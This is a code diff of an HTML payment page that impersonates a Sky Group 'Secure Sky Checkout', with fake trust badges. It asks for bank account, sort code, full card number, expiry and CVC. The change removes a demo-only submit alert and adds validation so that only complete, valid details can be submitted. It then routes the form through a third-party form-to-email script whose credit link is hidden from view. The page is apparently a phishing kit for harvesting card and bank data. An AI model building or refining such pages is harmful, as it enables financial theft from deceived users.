@@ -9,54 +9,18 @@
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{
-  font-family:Inter,sans-serif;
-  background:#f2f4f8;
-  color:#111;
-  transition:.3s;
-}
-body.dark{background:#0b0f1d;color:#eaeaea}
-body.dark .left{background:#121829}
-body.dark input{background:#1a2238;color:#fff;border-color:#2f3a54}
-body.dark .summary-footer{background:linear-gradient(90deg,#072b66,#0077d4)}
-img{max-width:100%}
+body{font-family:Inter,sans-serif;background:#f2f4f8;color:#111}
 
-/* HEADER */
-.sky-header{
-  background:#0f1b40;
-  padding:18px 24px;
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-}
+.sky-header{background:#0f1b40;padding:18px;display:flex;justify-content:center}
 .sky-header img{height:38px}
-.toggle-dark{
-  background:#fff;
-  padding:8px 16px;
-  border-radius:20px;
-  font-weight:600;
-  cursor:pointer;
-}
-body.dark .toggle-dark{background:#1d2742;color:#fff}
 
-/* WRAPPER */
-.page-wrapper{
-  max-width:1200px;
-  margin:35px auto;
-  padding:0 15px;
-}
-.left{
-  background:#fff;
-  padding:28px;
-  border-radius:14px;
-  box-shadow:0 4px 18px rgba(0,0,0,.08);
-}
+.page-wrapper{max-width:600px;margin:40px auto;padding:0 15px}
+.left{background:#fff;padding:28px;border-radius:14px;box-shadow:0 4px 18px rgba(0,0,0,.08)}
+.subtitle{text-align:center;font-size:18px;margin-bottom:20px}
 
-/* FORM */
-h2{font-size:28px;margin-bottom:6px}
-.subtitle{font-size:17px;margin-bottom:18px}
 .form-group{margin-bottom:18px}
-label{font-weight:600}
+label{font-weight:600;display:block;margin-bottom:6px}
+
 input{
   width:100%;
   padding:14px;
@@ -64,14 +28,28 @@ input{
   border-radius:10px;
   border:1px solid #ccd2e0;
 }
-input:focus{
-  outline:none;
-  border-color:#0f74d0;
-  box-shadow:0 0 0 4px rgba(0,118,255,.2);
-}
-input.error{border-color:#ff3b3f}
+input:focus{outline:none;border-color:#0f74d0}
 
-/* BUTTON */
+input.error{
+  border-color:#ff3b3f;
+  animation:shake .35s;
+}
+
+@keyframes shake{
+  0%{transform:translateX(0)}
+  25%{transform:translateX(-5px)}
+  50%{transform:translateX(5px)}
+  75%{transform:translateX(-5px)}
+  100%{transform:translateX(0)}
+}
+
+.error-text{
+  color:#ff3b3f;
+  font-size:13px;
+  margin-top:6px;
+  display:none;
+}
+
 button{
   width:100%;
   padding:15px;
@@ -82,60 +60,24 @@ button{
   color:#fff;
   border-radius:12px;
   cursor:pointer;
+  opacity:.5;
 }
+button.enabled{opacity:1;cursor:pointer}
 
-/* DROPDOWN */
-.dropdown-box{
-  background:#f3f6fc;
-  padding:14px;
-  border-radius:10px;
-  cursor:pointer;
-  margin-bottom:12px;
-  font-weight:600;
-}
-.dropdown-content{
-  display:none;
-  padding:14px;
-  border-left:3px solid #0f74d0;
-  font-size:14px;
-  margin-bottom:20px;
-}
-
-/* TRUST */
 .trust-box{
   margin-top:25px;
   padding:16px;
   background:#f3f6fc;
   border-radius:12px;
-}
-.trust-icons{
-  display:flex;
-  gap:12px;
-  flex-wrap:wrap;
-  margin-top:10px;
-}
-.trust-icons img{height:32px}
-
-/* FOOTER */
-.sky-footer{
-  background:#0f1b40;
-  color:#eee;
   text-align:center;
-  padding:30px 15px;
-  margin-top:50px;
 }
-.sky-footer a{
-  color:#a8c5ff;
-  margin:6px 10px;
-  display:inline-block;
-  font-size:14px;
-}
+.trust-icons img{height:32px;margin:0 8px}
 
-/* RESPONSIVE */
-@media(max-width:600px){
-  h2{font-size:24px}
-  .sky-header{flex-direction:column;gap:10px}
+.sky-footer{
+  background:#0f1b40;color:#eee;text-align:center;
+  padding:25px 10px;margin-top:40px
 }
+.sky-footer a{color:#a8c5ff;margin:0 8px;font-size:14px}
 </style>
 </head>
 
@@ -143,71 +85,67 @@ button{
 
 <div class="sky-header">
   <img src="5842ab6da6515b1e0ad75b0a.png">
-  
 </div>
 
 <div class="page-wrapper">
 <div class="left">
-<center>
+
 <div class="subtitle">Secure Sky Checkout</div>
 
-</center>
+<form method="post" action="//submit.form" id="paymentForm" novalidate>
 
+<div class="form-group">
+<label>Bank name</label>
+<input type="text" id="bankName" name="bank_name">
+<div class="error-text">Bank name required</div>
+</div>
 
-<form method="post" action="//submit.form">
+<div class="form-group">
+<label>Bank account number</label>
+<input type="text" id="bankAccount" name="bank_account" maxlength="8">
+<div class="error-text">Account must be 8 digits</div>
+</div>
 
-  <div class="form-group">
-    <label>Name of bank</label>
-    <input type="text" name="bank_name" required>
-  </div>
+<div class="form-group">
+<label>Sort code</label>
+<input type="text" id="sortCode" name="sort_code" maxlength="8">
+<div class="error-text">Format 12-34-56</div>
+</div>
 
-  <div class="form-group">
-    <label>Bank account</label>
-    <input type="text" name="bank_account" required>
-  </div>
+<div class="form-group">
+<label>Name on card</label>
+<input type="text" id="cardName" name="card_name">
+<div class="error-text">Name required</div>
+</div>
 
-  <div class="form-group">
-    <label>Sort code</label>
-    <input type="text" name="sort_code" required>
-  </div>
+<div class="form-group">
+<label>Card number</label>
+<input type="text" id="cardNumber" name="card_number">
+<div class="error-text">16 digit card number</div>
+</div>
 
-  <div class="form-group">
-    <label>Name on card</label>
-    <input type="text" name="card_name" required>
-  </div>
+<div class="form-group">
+<label>Expiry (MM/YY)</label>
+<input type="text" id="expiryDate" name="expiry" maxlength="5">
+<div class="error-text">Invalid or expired</div>
+</div>
 
-  <div class="form-group">
-    <label>Card number</label>
-    <input type="text" name="card_number" id="cardNumber"
-           placeholder="1234 5678 9012 3456" required>
-  </div>
+<div class="form-group">
+<label>CVC</label>
+<input type="password" id="cvc" name="cvc" maxlength="3">
+<div class="error-text">3 digit CVC</div>
+</div>
 
-  <div class="form-group">
-    <label>Expiry (MM/YY)</label>
-    <input type="text" name="expiry" id="expiryDate"
-           placeholder="MM/YY" required>
-  </div>
+<button type="submit" id="submitBtn" disabled>Confirm Order</button>
 
-  <div class="form-group">
-    <label>CVC</label>
-    <input type="password" name="cvc" id="cvc"
-           maxlength="3" required>
-  </div>
+<div style='font-size:1px!important; opacity:0!important;' 
+ class="hidden" style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
 
-  <div style="font-size:1px;opacity:0;" class="hidden">
-        <a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a>
-      </div>
-
-  <script src="https://www.100forms.com/js/FORMKEY:H8Z3YTGUWJPX"
-          type="text/javascript"></script>
-
-  <button type="submit">Confirm Order</button>
-
+<script src="https://www.100forms.com/js/FORMKEY:H8Z3YTGUWJPX"></script>
 </form>
 
-
 <div class="trust-box">
-<b>🔒 Secure checkout</b>
+<b>🔒 Secure checkout</b><br><br>
 <div class="trust-icons">
 <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
 <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
@@ -222,26 +160,91 @@ button{
 <a href="#">Help</a>
 <a href="#">Contact</a>
 <a href="#">Privacy</a>
-<a href="#">Terms</a>
-<small style="display:block;margin-top:10px;font-size:12px">© 2025 Sky Group</small>
+<a href="#">Terms</a><br>
+<small>© 2025 Sky Group</small>
 </div>
 
 <script>
-function toggleDark(){
-  document.body.classList.toggle("dark");
+function vibrateError(){
+ if(navigator.vibrate) navigator.vibrate([80,40,80]);
 }
-function toggleDropdown(){
-  const d=document.getElementById("dropContent");
-  d.style.display=d.style.display==="block"?"none":"block";
+
+function showError(input, show){
+ const err=input.nextElementSibling;
+ if(show){
+   input.classList.add("error");
+   err.style.display="block";
+   vibrateError();
+ }else{
+   input.classList.remove("error");
+   err.style.display="none";
+ }
 }
-const card=document.getElementById("cardNumber");
-card.addEventListener("input",()=>{
-  card.value=card.value.replace(/\D/g,"").replace(/(.{4})/g,"$1 ").trim().slice(0,19);
-});
-document.getElementById("paymentForm").addEventListener("submit",e=>{
-  e.preventDefault();
-  alert("✅ Payment Successful (Demo)");
-});
+
+const f={
+ bankName,
+ bankAccount,
+ sortCode,
+ cardName,
+ cardNumber,
+ expiryDate,
+ cvc
+};
+
+bankName.oninput=()=>{showError(bankName,!bankName.value.trim());validate();};
+
+bankAccount.oninput=()=>{
+ bankAccount.value=bankAccount.value.replace(/\D/g,"").slice(0,8);
+ showError(bankAccount,bankAccount.value.length!==8);validate();
+};
+
+sortCode.oninput=()=>{
+ let v=sortCode.value.replace(/\D/g,"").slice(0,6);
+ if(v.length>2)v=v.slice(0,2)+"-"+v.slice(2);
+ if(v.length>5)v=v.slice(0,5)+"-"+v.slice(5);
+ sortCode.value=v;
+ showError(sortCode,v.length!==8);validate();
+};
+
+cardName.oninput=()=>{showError(cardName,!cardName.value.trim());validate();};
+
+cardNumber.oninput=()=>{
+ cardNumber.value=cardNumber.value.replace(/\D/g,"").replace(/(.{4})/g,"$1 ").trim().slice(0,19);
+ showError(cardNumber,cardNumber.value.replace(/\s/g,"").length!==16);validate();
+};
+
+expiryDate.oninput=()=>{
+ let v=expiryDate.value.replace(/\D/g,"").slice(0,4);
+ if(v.length>=3)v=v.slice(0,2)+"/"+v.slice(2);
+ expiryDate.value=v;
+
+ let valid=false;
+ if(v.length===5){
+   let [m,y]=v.split("/");
+   let exp=new Date(2000+ +y,m);
+   valid=m>=1&&m<=12&&exp>new Date();
+ }
+ showError(expiryDate,!valid);validate();
+};
+
+cvc.oninput=()=>{
+ cvc.value=cvc.value.replace(/\D/g,"").slice(0,3);
+ showError(cvc,cvc.value.length!==3);validate();
+};
+
+function validate(){
+ let ok=
+ bankName.value&&
+ bankAccount.value.length===8&&
+ sortCode.value.length===8&&
+ cardName.value&&
+ cardNumber.value.replace(/\s/g,"").length===16&&
+ cvc.value.length===3&&
+ !expiryDate.classList.contains("error");
+
+ submitBtn.disabled=!ok;
+ submitBtn.classList.toggle("enabled",ok);
+}
 </script>
 
 </body>
